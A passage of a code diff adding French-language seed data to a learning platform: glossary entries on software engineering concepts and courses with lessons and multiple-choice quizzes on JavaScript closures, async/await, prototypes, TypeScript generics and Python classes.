+    relatedKeys: ["design-patterns", "technical-debt"],
+    prerequisiteKeys: [],
+    aliases: ["code propre"],
+  },
+  {
+    key: "technical-debt",
+    name: "Dette technique",
+    category: "DEVELOPMENT",
+    level: 2,
+    definition:
+      "Le coût futur implicite d'un raccourci pris aujourd'hui (code rapide mais mal structuré, absence de tests, documentation manquante) — comme une dette financière, elle génère des « intérêts » qui rendent le code de plus en plus coûteux à faire évoluer si elle n'est jamais remboursée.",
+    explanationBeginner:
+      "Livrer vite en prenant un raccourci n'est pas toujours une erreur — parfois c'est un choix pragmatique justifié. Le problème survient quand cette dette s'accumule sans jamais être « remboursée » (refactorée) : chaque nouvelle fonctionnalité devient plus lente et risquée à ajouter sur une base de code de plus en plus fragile.",
+    explanationAdvanced:
+      "Toute dette technique n'est pas volontaire — elle peut venir d'un manque de connaissance au moment de l'écriture, ou d'exigences qui ont changé depuis. La distinction utile est entre dette délibérée et consciente (compromis assumé pour tenir un délai, avec un plan de remboursement) et dette accidentelle (résultant d'un manque de rigueur) — la première est un outil de gestion de projet légitime, la seconde un signal d'alerte sur le process de développement.",
+    docUrl: "https://martinfowler.com/bliki/TechnicalDebt.html",
+    relatedKeys: ["clean-code"],
+    prerequisiteKeys: [],
+    aliases: ["dette technique"],
+  },
+  {
+    key: "rate-limiting",
+    name: "Rate Limiting",
+    category: "DEVELOPMENT",
+    level: 2,
+    definition:
+      "Une technique qui limite le nombre de requêtes qu'un client peut effectuer sur une API dans une fenêtre de temps donnée, pour protéger le service contre les abus et la surcharge.",
+    explanationBeginner:
+      "Sans limite, un client (volontairement malveillant ou juste buggé) pourrait envoyer des milliers de requêtes par seconde et saturer le serveur pour tous les autres utilisateurs — le rate limiting impose un plafond (ex: « 100 requêtes par minute par utilisateur ») et rejette les requêtes en excès avec un code `429 Too Many Requests`.",
+    explanationAdvanced:
+      "Plusieurs algorithmes existent : token bucket (un « seau » de jetons se remplit à débit constant, chaque requête consomme un jeton, autorisant des pics courts tant que le seau n'est pas vide), sliding window (compte les requêtes sur une fenêtre glissante plus précise qu'une fenêtre fixe qui peut être contournée à la frontière de deux fenêtres). Le rate limiting est aussi une défense de base contre le brute force (limiter les tentatives de connexion) et certaines formes de DDoS applicatif.",
+    docUrl: "https://cloud.google.com/architecture/rate-limiting-strategies-techniques",
+    relatedKeys: ["ddos", "brute-force-attack"],
+    prerequisiteKeys: [],
+    aliases: ["limitation de debit"],
+  },
+  {
+    key: "message-queue",
+    name: "Message Queue",
+    category: "DEVELOPMENT",
+    level: 3,
+    definition:
+      "Un système intermédiaire qui permet à un service (producteur) d'envoyer des messages/tâches à traiter plus tard par un autre service (consommateur), sans que les deux aient besoin d'être disponibles au même moment.",
+    explanationBeginner:
+      "Plutôt que de traiter une tâche lente (envoyer un email, générer un rapport) directement pendant qu'un utilisateur attend une réponse, on la place dans une file d'attente — un processus séparé la traite en arrière-plan, et l'utilisateur reçoit une réponse immédiate sans attendre que la tâche lente se termine.",
+    explanationAdvanced:
+      "Ce découplage améliore la résilience : si le service consommateur tombe temporairement en panne, les messages restent en file d'attente et sont traités dès son retour, plutôt que d'être perdus. Des outils comme RabbitMQ ou Kafka implémentent ce pattern à grande échelle — Kafka en particulier est optimisé pour un débit très élevé de flux d'événements continus (event streaming), pas seulement une simple file de tâches ponctuelles.",
+    docUrl: "https://aws.amazon.com/message-queue/",
+    relatedKeys: ["microservices", "event-driven-architecture"],
+    prerequisiteKeys: [],
+    aliases: ["file de messages", "queue"],
+  },
+  {
+    key: "microservices",
+    name: "Microservices",
+    category: "DEVELOPMENT",
+    level: 4,
+    definition:
+      "Un style d'architecture où une application est découpée en plusieurs services indépendants et déployables séparément, chacun responsable d'une fonctionnalité métier précise, communiquant entre eux via le réseau (API, message queue).",
+    explanationBeginner:
+      "Au lieu d'une seule grosse application (« monolithe ») qui gère tout, on découpe en petits services indépendants (ex: service de paiement, service d'authentification, service de notifications) — chacun peut être développé, déployé et mis à l'échelle séparément par des équipes différentes.",
+    explanationAdvanced:
+      "Ce découplage a un coût réel : la complexité opérationnelle augmente fortement (gestion de multiples déploiements, communication réseau entre services qui peut échouer là où un appel de fonction locale ne le pouvait pas, cohérence des données réparties entre plusieurs bases). Un monolithe bien structuré (avec des modules internes clairement séparés) reste souvent le meilleur choix par défaut pour une équipe petite ou un produit encore jeune — les microservices résolvent des problèmes d'échelle organisationnelle et technique qui n'existent pas encore à ce stade.",
+    docUrl: "https://martinfowler.com/articles/microservices.html",
+    relatedKeys: ["message-queue", "load-balancer"],
+    prerequisiteKeys: [],
+    aliases: [],
   },
 ];
 
@@ -2039,6 +2536,1351 @@ const COURSES: CourseSeed[] = [
             correctIndex: 1,
             explanation:
               "Un modèle peut halluciner avec une confiance apparente identique à une réponse correcte — la seule protection fiable est de vérifier soi-même les informations critiques avant de s'y fier.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "js-closures-scope",
+    title: "Scope et Closures en JavaScript",
+    description: "Comprendre la portée des variables et le mécanisme des closures, souvent le point de blocage n°1 des devs JS intermédiaires.",
+    category: "DEVELOPMENT",
+    skillKey: "javascript",
+    level: 2,
+    prerequisiteCourseKeys: ["js-intro"],
+    lessons: [
+      {
+        order: 1,
+        title: "Scope global, de fonction, de bloc",
+        content:
+          "Le **scope** (portée) détermine où une variable est accessible. `var` a une portée de fonction (elle « fuit » hors des blocs `if`/`for`), tandis que `let` et `const` ont une portée de bloc (`{ }`) — c'est la raison principale pour laquelle `var` est déconseillé en code moderne : son comportement de portée est moins prévisible.\n\n" +
+          "```js\nif (true) {\n  var a = 1; // accessible en dehors du bloc\n  let b = 2; // uniquement dans ce bloc\n}\nconsole.log(a); // 1\nconsole.log(b); // ReferenceError\n```\n\n" +
+          "Le **scope lexical** signifie que la portée d'une variable est déterminée par l'endroit où elle est écrite dans le code source, pas par l'endroit d'où la fonction est appelée.",
+        xpReward: 20,
+        questions: [
+          {
+            order: 1,
+            prompt: "Pourquoi `var` est-il déconseillé en code JavaScript moderne ?",
+            choices: [
+              "Il est plus lent que `let`",
+              "Sa portée est celle de la fonction entière, pas du bloc — il peut « fuir » hors d'un `if`/`for` de façon peu prévisible",
+              "Il n'existe plus dans les navigateurs récents",
+              "Il ne peut contenir que des nombres",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`var` ignore les blocs `{ }` et reste accessible dans toute la fonction englobante, ce qui cause des bugs difficiles à repérer — `let`/`const` corrigent ce comportement.",
+          },
+          {
+            order: 2,
+            prompt: "Que signifie « scope lexical » ?",
+            choices: [
+              "La portée dépend de l'endroit d'où la fonction est appelée",
+              "La portée est déterminée par l'endroit où le code est écrit dans le fichier source",
+              "Chaque variable a une portée globale par défaut",
+              "Le scope change à chaque exécution",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le scope lexical se fixe à l'écriture du code, pas à son exécution — une fonction « voit » toujours les variables qui l'entourent dans le fichier, peu importe d'où elle est appelée.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Qu'est-ce qu'une closure ?",
+        content:
+          "Une **closure** est une fonction qui « se souvient » des variables de son scope englobant, même après que ce scope a fini de s'exécuter.\n\n" +
+          "```js\nfunction createCounter() {\n  let count = 0;\n  return function () {\n    count++;\n    return count;\n  };\n}\nconst counter = createCounter();\nconsole.log(counter()); // 1\nconsole.log(counter()); // 2\n```\n\n" +
+          "`createCounter()` s'est déjà terminée, mais la fonction retournée garde un accès privé à `count` — chaque appel à `createCounter()` crée un `count` indépendant. C'est le mécanisme derrière l'encapsulation de données privées en JS avant l'arrivée des champs privés de classe (`#count`).",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Dans l'exemple `createCounter()`, pourquoi `counter()` peut-il encore accéder à `count` alors que `createCounter()` a fini de s'exécuter ?",
+            choices: [
+              "`count` est une variable globale",
+              "La fonction retournée forme une closure qui garde une référence vivante au scope de `createCounter`",
+              "JavaScript recrée `count` à chaque appel de `counter()`",
+              "C'est un bug qui ne devrait pas fonctionner",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Une closure garde vivant le scope dans lequel elle a été créée — `count` continue d'exister tant que la fonction retournée existe, même si `createCounter()` est terminée.",
+          },
+          {
+            order: 2,
+            prompt: "Si on appelle `createCounter()` une deuxième fois pour créer `counter2`, que se passe-t-il ?",
+            choices: [
+              "`counter2` partage le même `count` que `counter`",
+              "`counter2` a son propre `count` indépendant, qui démarre à 0",
+              "Une erreur est levée : `createCounter` ne peut être appelée qu'une fois",
+              "`count` devient automatiquement global",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Chaque appel de `createCounter()` crée un nouveau scope, donc un nouveau `count` — les closures qui en résultent sont totalement indépendantes les unes des autres.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Piège classique : closures dans une boucle",
+        content:
+          "Un piège très fréquent : capturer la variable de boucle dans une closure créée à l'intérieur d'un `for`.\n\n" +
+          "```js\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}\n// Affiche 3, 3, 3 — pas 0, 1, 2 !\n```\n\n" +
+          "Avec `var`, il n'existe qu'une seule variable `i` partagée par toutes les itérations : au moment où les callbacks s'exécutent (après la boucle), `i` vaut déjà 3. En remplaçant `var` par `let`, chaque itération crée une nouvelle liaison de `i` scoped au bloc — le résultat devient `0, 1, 2`, celui attendu.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Avec `for (var i = 0; i < 3; i++) { setTimeout(() => console.log(i), 0); }`, qu'affiche la console ?",
+            choices: ["0, 1, 2", "3, 3, 3", "0, 0, 0", "Une erreur"],
+            correctIndex: 1,
+            explanation:
+              "`var` crée une seule variable `i` partagée par toute la boucle — quand les callbacks s'exécutent (après la fin de la boucle), `i` vaut déjà 3 pour les trois.",
+          },
+          {
+            order: 2,
+            prompt: "Quel changement minimal corrige ce piège pour obtenir `0, 1, 2` ?",
+            choices: [
+              "Remplacer `setTimeout` par `setInterval`",
+              "Remplacer `var` par `let` dans la déclaration de la boucle",
+              "Ajouter `async` devant la fonction fléchée",
+              "Ce comportement ne peut pas être corrigé",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`let` crée une nouvelle liaison de `i` à chaque itération (scope de bloc), donc chaque closure capture bien sa propre valeur d'`i` au moment de sa création.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "js-async-promises",
+    title: "Promises, Async/Await et Event Loop",
+    description: "Comprendre comment JavaScript gère les opérations asynchrones sans bloquer le thread principal.",
+    category: "DEVELOPMENT",
+    skillKey: "javascript",
+    level: 3,
+    prerequisiteCourseKeys: ["js-closures-scope"],
+    lessons: [
+      {
+        order: 1,
+        title: "Le problème que résolvent les Promises",
+        content:
+          "JavaScript est **mono-thread** : une seule opération s'exécute à la fois. Pour éviter qu'une opération lente (requête réseau, lecture de fichier) ne bloque tout le reste, JS délègue ces opérations à l'environnement (navigateur ou Node.js) et continue son exécution — le résultat arrive plus tard, de façon asynchrone.\n\n" +
+          "Une **Promise** représente une valeur qui n'est pas encore disponible mais le sera (ou échouera) plus tard. Elle a 3 états : `pending` (en attente), `fulfilled` (résolue avec succès) ou `rejected` (échouée) — une fois `fulfilled` ou `rejected`, son état ne change plus jamais.\n\n" +
+          "```js\nfetch('/api/user')\n  .then(res => res.json())\n  .then(data => console.log(data))\n  .catch(err => console.error(err));\n```",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Pourquoi JavaScript délègue-t-il les opérations lentes (réseau, fichiers) plutôt que d'attendre directement ?",
+            choices: [
+              "JavaScript ne peut pas faire d'opérations lentes",
+              "JavaScript est mono-thread : attendre bloquerait toute exécution de code pendant ce temps",
+              "C'est uniquement pour respecter une convention de style",
+              "Les opérations lentes ne fonctionnent qu'en asynchrone par obligation du navigateur",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Avec un seul thread d'exécution, attendre une opération lente de façon synchrone gèlerait toute la page (ou le serveur Node.js) — d'où la délégation asynchrone.",
+          },
+          {
+            order: 2,
+            prompt: "Une fois qu'une Promise est passée à l'état `fulfilled`, que peut-il se passer ensuite ?",
+            choices: [
+              "Elle peut encore repasser à `pending`",
+              "Elle peut encore devenir `rejected`",
+              "Rien : son état est définitif, elle reste `fulfilled` pour toujours",
+              "Elle redevient automatiquement `pending` après 1 seconde",
+            ],
+            correctIndex: 2,
+            explanation:
+              "Une Promise n'est « réglée » (settled) qu'une seule fois — une fois `fulfilled` ou `rejected`, son état ne change plus jamais.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "async/await : du sucre syntaxique lisible",
+        content:
+          "`async`/`await` permet d'écrire du code asynchrone qui *ressemble* à du code synchrone, sans changer le fonctionnement réel des Promises en dessous.\n\n" +
+          "```js\nasync function getUser() {\n  try {\n    const res = await fetch('/api/user');\n    const data = await res.json();\n    return data;\n  } catch (err) {\n    console.error(err);\n  }\n}\n```\n\n" +
+          "Une fonction `async` retourne **toujours** une Promise, même si on `return` une valeur simple. `await` suspend l'exécution de la fonction (pas du programme entier) jusqu'à ce que la Promise soit réglée — le `try/catch` classique remplace élégamment les chaînes `.then().catch()`.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que retourne toujours une fonction déclarée `async`, même si elle fait `return 42;` ?",
+            choices: ["La valeur brute 42", "Une Promise (résolue avec la valeur 42)", "undefined", "Un objet Error"],
+            correctIndex: 1,
+            explanation:
+              "Une fonction `async` encapsule automatiquement sa valeur de retour dans une Promise — même `return 42;` devient une `Promise<number>` résolue avec 42.",
+          },
+          {
+            order: 2,
+            prompt: "Que suspend précisément `await` ?",
+            choices: [
+              "Tout le programme, y compris les autres onglets du navigateur",
+              "Uniquement l'exécution de la fonction `async` courante, pas le reste du programme",
+              "Le rendu visuel de la page pendant 1 seconde fixe",
+              "Rien, `await` n'a aucun effet réel",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`await` met en pause seulement la fonction `async` dans laquelle il se trouve — le reste du programme (autres timers, autres event handlers) continue de s'exécuter normalement.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "L'Event Loop en bref",
+        content:
+          "L'**Event Loop** est le mécanisme qui permet à JavaScript (mono-thread) de gérer l'asynchrone. Simplifié :\n\n" +
+          "1. Le **call stack** exécute le code synchrone en cours.\n" +
+          "2. Les opérations async (timers, requêtes réseau) sont déléguées à l'environnement, qui place leur callback dans une **queue** une fois terminées.\n" +
+          "3. L'event loop ne dépile la queue vers le call stack QUE quand celui-ci est vide.\n\n" +
+          "Conséquence concrète : `setTimeout(fn, 0)` n'exécute PAS `fn` immédiatement — `fn` attend que tout le code synchrone en cours se termine d'abord, même avec un délai de 0ms. Les Promises ont leur propre queue (**microtask queue**), traitée en priorité sur la queue des timers (**macrotask queue**), ce qui explique pourquoi un `.then()` s'exécute avant un `setTimeout(fn, 0)` posé juste avant.",
+        xpReward: 30,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que se passe-t-il réellement avec `setTimeout(fn, 0)` ?",
+            choices: [
+              "`fn` s'exécute immédiatement, avant tout autre code",
+              "`fn` attend que tout le code synchrone en cours se termine, même avec un délai de 0ms",
+              "`fn` ne s'exécute jamais",
+              "`fn` s'exécute sur un thread séparé en parallèle",
+            ],
+            correctIndex: 1,
+            explanation:
+              "L'event loop ne dépile la queue des callbacks que quand le call stack est vide — un délai de 0ms ne garantit pas une exécution immédiate, juste un minimum d'attente.",
+          },
+          {
+            order: 2,
+            prompt: "Entre un `.then()` de Promise et un `setTimeout(fn, 0)` posés au même moment, lequel s'exécute en premier ?",
+            choices: [
+              "Le `setTimeout`, toujours",
+              "Le `.then()`, car la microtask queue (Promises) est traitée avant la macrotask queue (timers)",
+              "Cela dépend du hasard",
+              "Les deux s'exécutent exactement en même temps",
+            ],
+            correctIndex: 1,
+            explanation:
+              "L'event loop vide entièrement la microtask queue (Promises) avant de traiter la prochaine macrotask (timers) — un `.then()` passe donc systématiquement avant un `setTimeout(fn, 0)`.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "js-oop-prototypes",
+    title: "Objets, Prototypes et Classes en JavaScript",
+    description: "Comment JavaScript implémente l'orientation objet via les prototypes, et comment les classes ES6 s'appuient dessus.",
+    category: "DEVELOPMENT",
+    skillKey: "javascript",
+    level: 2,
+    prerequisiteCourseKeys: ["js-intro"],
+    lessons: [
+      {
+        order: 1,
+        title: "La chaîne de prototypes",
+        content:
+          "Contrairement à des langages comme Java, JavaScript n'a pas de vraies classes au niveau moteur — il utilise l'**héritage prototypal**. Chaque objet a un lien interne (`[[Prototype]]`, accessible via `Object.getPrototypeOf()`) vers un autre objet, dont il hérite les propriétés/méthodes.\n\n" +
+          "```js\nconst animal = { manger() { console.log('miam'); } };\nconst chien = Object.create(animal);\nchien.manger(); // 'miam' — hérité du prototype\n```\n\n" +
+          "Quand on accède à `chien.manger`, JS cherche d'abord sur `chien` lui-même ; s'il ne trouve pas, il remonte la **chaîne de prototypes** jusqu'à trouver la propriété (ou jusqu'à `null`, la fin de la chaîne).",
+        xpReward: 20,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que fait JavaScript quand on accède à une propriété absente d'un objet mais présente sur son prototype ?",
+            choices: [
+              "Il lance une erreur immédiatement",
+              "Il retourne `undefined` sans chercher plus loin",
+              "Il remonte la chaîne de prototypes jusqu'à trouver la propriété (ou jusqu'à la fin de la chaîne)",
+              "Il copie automatiquement toutes les propriétés du prototype sur l'objet",
+            ],
+            correctIndex: 2,
+            explanation:
+              "C'est le mécanisme d'héritage prototypal : la recherche remonte la chaîne `[[Prototype]]` tant que la propriété n'est pas trouvée, avant de retourner `undefined`.",
+          },
+          {
+            order: 2,
+            prompt: "Que fait `Object.create(animal)` ?",
+            choices: [
+              "Copie toutes les propriétés d'`animal` dans un nouvel objet indépendant",
+              "Crée un nouvel objet dont le prototype est `animal`",
+              "Modifie directement `animal`",
+              "Supprime le prototype de `animal`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`Object.create(proto)` crée un nouvel objet vide dont `[[Prototype]]` pointe vers `proto` — les propriétés d'`animal` deviennent accessibles par héritage, pas par copie.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Les classes ES6 : du sucre syntaxique",
+        content:
+          "Les classes introduites en ES6 (`class`) ne remplacent pas les prototypes — elles offrent une syntaxe plus lisible **au-dessus** du même mécanisme.\n\n" +
+          "```js\nclass Animal {\n  constructor(nom) { this.nom = nom; }\n  manger() { console.log(`${this.nom} mange`); }\n}\nclass Chien extends Animal {\n  aboyer() { console.log('Wouf !'); }\n}\nconst rex = new Chien('Rex');\nrex.manger(); // hérité d'Animal via le prototype\nrex.aboyer();\n```\n\n" +
+          "`extends` établit la chaîne de prototypes automatiquement — `Chien.prototype` a `Animal.prototype` comme prototype. Les champs privés (`#solde`) et les méthodes statiques (`static creer()`) sont des ajouts modernes qui simplifient l'encapsulation, autrefois obtenue uniquement via des closures.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que fait réellement `extends` sous le capot en JavaScript ?",
+            choices: [
+              "Copie toutes les méthodes de la classe parente dans la classe enfant",
+              "Établit une chaîne de prototypes entre les deux classes",
+              "Crée un système entièrement séparé des prototypes",
+              "N'a aucun effet réel, c'est juste indicatif",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`class Chien extends Animal` fait pointer `Chien.prototype` vers `Animal.prototype` via la chaîne de prototypes — les classes ES6 restent basées sur le même mécanisme d'héritage prototypal.",
+          },
+          {
+            order: 2,
+            prompt: "Avant les champs privés (`#solde`), comment obtenait-on une vraie encapsulation de données privées en JS ?",
+            choices: [
+              "Ce n'était pas possible du tout avant ES2022",
+              "Via des closures, en gardant la donnée dans le scope d'une fonction plutôt que sur l'objet",
+              "En nommant simplement la variable avec un underscore",
+              "En utilisant `Object.freeze()`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Les closures permettaient déjà une vraie encapsulation avant les champs privés — une variable gardée dans le scope d'une fonction constructeur, jamais exposée sur l'objet, était inaccessible de l'extérieur.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "`this` : le piège le plus fréquent",
+        content:
+          "La valeur de `this` dépend de **comment** une fonction est appelée, pas d'où elle est définie — une source fréquente de bugs.\n\n" +
+          "```js\nconst obj = {\n  nom: 'Nodify',\n  saluer() { console.log(this.nom); },\n};\nconst fn = obj.saluer;\nfn(); // undefined — `this` a perdu son contexte !\nobj.saluer(); // 'Nodify' — appelé via obj, this = obj\n```\n\n" +
+          "Les **fonctions fléchées** (`=>`) n'ont pas leur propre `this` : elles héritent du `this` du scope englobant au moment de leur définition, ce qui les rend très utiles dans des callbacks (`setTimeout`, événements) où on veut garder le `this` de la méthode parente. `.bind()`, `.call()` et `.apply()` permettent aussi de fixer explicitement `this`.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Dans l'exemple, pourquoi `fn()` affiche `undefined` alors qu'`obj.saluer()` affiche `'Nodify'` ?",
+            choices: [
+              "`fn` et `obj.saluer` ne sont pas la même fonction",
+              "`this` dépend de la façon dont la fonction est appelée : `fn()` est appelée sans objet, donc `this` perd le contexte d'`obj`",
+              "C'est un bug du moteur JavaScript",
+              "`nom` a été supprimé entre les deux appels",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`this` est déterminé à l'appel, pas à la définition — appeler `fn()` seule (sans `obj.`) fait perdre le lien avec `obj`, donc `this.nom` devient `undefined`.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi les fonctions fléchées sont-elles utiles dans un callback qui a besoin du `this` de la méthode parente ?",
+            choices: [
+              "Parce qu'elles créent toujours un nouveau `this` pointant sur `window`",
+              "Parce qu'elles n'ont pas leur propre `this` et héritent de celui du scope englobant au moment de leur définition",
+              "Parce qu'elles sont plus rapides à exécuter",
+              "Parce qu'elles empêchent toute utilisation de `this`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Une fonction fléchée capture le `this` lexical de son scope englobant (comme une closure le fait pour les variables) — pratique pour éviter de perdre le contexte dans un callback.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "ts-generics-utility-types",
+    title: "TypeScript avancé : Generics et Utility Types",
+    description: "Aller au-delà des types de base : écrire du code réutilisable et type-safe avec les generics, et exploiter les utility types intégrés.",
+    category: "DEVELOPMENT",
+    skillKey: "typescript",
+    level: 3,
+    prerequisiteCourseKeys: ["typescript-for-js-devs"],
+    lessons: [
+      {
+        order: 1,
+        title: "Generics : écrire du code réutilisable et typé",
+        content:
+          "Un **generic** est un « type paramétré » : on écrit une fonction ou un type une seule fois, valable pour plusieurs types concrets, sans perdre la vérification de type.\n\n" +
+          "```ts\nfunction premier<T>(arr: T[]): T {\n  return arr[0];\n}\npremier([1, 2, 3]);       // T = number, retourne un number\npremier(['a', 'b']);      // T = string, retourne un string\n```\n\n" +
+          "Sans generics, on utiliserait `any` (perte totale du typage : `premier([1,2,3])` pourrait retourner n'importe quoi sans avertissement du compilateur) ou on dupliquerait la fonction pour chaque type. Le generic `T` garde la relation entre le type d'entrée et le type de sortie, vérifiée par le compilateur.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que perd-on en utilisant `any` à la place d'un generic `<T>` ?",
+            choices: [
+              "Rien, c'est strictement équivalent",
+              "La vérification de type : le compilateur n'avertit plus des erreurs de type liées à cette valeur",
+              "La possibilité d'utiliser des tableaux",
+              "La compatibilité avec JavaScript",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`any` désactive la vérification de type pour cette valeur — le generic garde au contraire la relation exacte entre le type d'entrée et de sortie, vérifiée à la compilation.",
+          },
+          {
+            order: 2,
+            prompt: "Dans `function premier<T>(arr: T[]): T`, que représente `T` ?",
+            choices: [
+              "Un type fixe, toujours `number`",
+              "Un paramètre de type, déterminé selon l'argument réellement passé à chaque appel",
+              "Une abréviation de `true`",
+              "Un mot-clé sans signification particulière",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`T` est un paramètre de type : le compilateur l'infère à partir de l'argument fourni à chaque appel (`number[]` → `T = number`, `string[]` → `T = string`).",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Utility Types les plus utiles",
+        content:
+          "TypeScript fournit des **utility types** intégrés pour transformer des types existants sans les réécrire à la main :\n\n" +
+          "- `Partial<T>` : rend toutes les propriétés de `T` optionnelles (utile pour un objet de mise à jour partielle).\n" +
+          "- `Required<T>` : rend toutes les propriétés obligatoires (inverse de `Partial`).\n" +
+          "- `Pick<T, 'a' | 'b'>` : ne garde que certaines propriétés de `T`.\n" +
+          "- `Omit<T, 'a'>` : garde toutes les propriétés de `T` sauf celles listées.\n" +
+          "- `Readonly<T>` : rend toutes les propriétés en lecture seule.\n\n" +
+          "```ts\ninterface User { id: number; nom: string; email: string; }\nfunction updateUser(id: number, changes: Partial<User>) { /* ... */ }\nupdateUser(1, { nom: 'Alice' }); // valide, pas besoin de fournir email\n```",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que fait `Partial<User>` ?",
+            choices: [
+              "Supprime la moitié des propriétés de `User`",
+              "Rend toutes les propriétés de `User` optionnelles",
+              "Rend toutes les propriétés de `User` en lecture seule",
+              "Crée un tableau de `User`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`Partial<T>` transforme chaque propriété de `T` en propriété optionnelle — très utile pour typer un objet représentant une mise à jour partielle.",
+          },
+          {
+            order: 2,
+            prompt: "Quelle est la différence entre `Pick<T, 'a'>` et `Omit<T, 'a'>` ?",
+            choices: [
+              "Elles sont strictement identiques",
+              "`Pick` ne garde que la propriété listée, `Omit` garde tout sauf la propriété listée",
+              "`Pick` supprime des propriétés, `Omit` en ajoute",
+              "`Omit` ne fonctionne que sur des tableaux",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`Pick<T, K>` construit un type avec uniquement les clés `K` de `T` ; `Omit<T, K>` fait l'inverse — garde tout `T` sauf les clés `K`.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Narrowing : affiner un type au fil du code",
+        content:
+          "Le **narrowing** (rétrécissement) est le processus par lequel TypeScript affine le type d'une variable au sein d'un bloc conditionnel, à partir de vérifications runtime classiques.\n\n" +
+          "```ts\nfunction traiter(valeur: string | number) {\n  if (typeof valeur === 'string') {\n    valeur.toUpperCase(); // TS sait ici que valeur est string\n  } else {\n    valeur.toFixed(2); // TS sait ici que valeur est number\n  }\n}\n```\n\n" +
+          "Sur des objets, `in` (`'email' in user`) ou une propriété discriminante commune (`type: 'circle' | 'square'`) permettent le même affinage. C'est ce mécanisme qui rend les **union types** (`string | number`) réellement pratiques à l'usage : pas besoin de cast manuel, TypeScript comprend les vérifications runtime standard.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que fait TypeScript après un `if (typeof valeur === 'string')` sur une variable de type `string | number` ?",
+            choices: [
+              "Rien, il faut caster manuellement le type",
+              "Il affine (narrow) le type de la variable en `string` à l'intérieur de ce bloc",
+              "Il lève une erreur de compilation",
+              "Il transforme la variable en `any`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "C'est le narrowing : TypeScript comprend les vérifications runtime classiques (`typeof`, `in`, propriété discriminante) et affine le type en conséquence dans chaque branche.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi le narrowing rend-il les union types (`string | number`) pratiques à utiliser ?",
+            choices: [
+              "Il élimine le besoin d'union types",
+              "Il permet d'utiliser en sécurité les méthodes propres à chaque type après une vérification runtime, sans cast manuel",
+              "Il convertit automatiquement toutes les valeurs en string",
+              "Il n'a aucun rapport avec les union types",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Sans narrowing, il faudrait caster manuellement (`as string`) à chaque usage, perdant en partie la sécurité du typage — le narrowing garde la vérification automatique du compilateur.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "python-oop-modules",
+    title: "Python : POO, Modules et Environnements virtuels",
+    description: "Structurer du code Python avec des classes, l'organiser en modules, et isoler ses dépendances proprement.",
+    category: "DEVELOPMENT",
+    skillKey: "python",
+    level: 2,
+    prerequisiteCourseKeys: ["python-intro"],
+    lessons: [
+      {
+        order: 1,
+        title: "Classes et objets en Python",
+        content:
+          "Python est orienté objet nativement. Une classe se définit avec `class`, et `__init__` est le constructeur — appelé automatiquement à la création d'une instance.\n\n" +
+          "```python\nclass Utilisateur:\n    def __init__(self, nom, email):\n        self.nom = nom\n        self.email = email\n\n    def saluer(self):\n        return f\"Bonjour {self.nom}\"\n\nu = Utilisateur(\"Alice\", \"alice@example.com\")\nprint(u.saluer())  # Bonjour Alice\n```\n\n" +
+          "`self` (premier paramètre de toute méthode d'instance) représente l'instance elle-même — Python ne le passe pas implicitement comme `this` en JS/Java, il faut le déclarer explicitement dans chaque méthode.",
+        xpReward: 20,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quand la méthode `__init__` d'une classe Python est-elle appelée ?",
+            choices: [
+              "Jamais automatiquement, il faut l'appeler manuellement",
+              "Automatiquement à chaque création d'une nouvelle instance de la classe",
+              "Uniquement quand on appelle `print()` sur l'objet",
+              "Une seule fois pour toute la classe, peu importe le nombre d'instances",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`__init__` est le constructeur : Python l'appelle automatiquement à chaque fois qu'une nouvelle instance est créée (`Utilisateur(\"Alice\", ...)`), pour initialiser ses attributs.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi `self` doit-il être déclaré explicitement comme premier paramètre de chaque méthode en Python ?",
+            choices: [
+              "C'est optionnel, Python l'ajoute automatiquement si absent",
+              "Python ne passe pas implicitement la référence à l'instance comme le ferait `this` en JS — il faut la déclarer",
+              "`self` est un mot-clé réservé sans rapport avec l'instance",
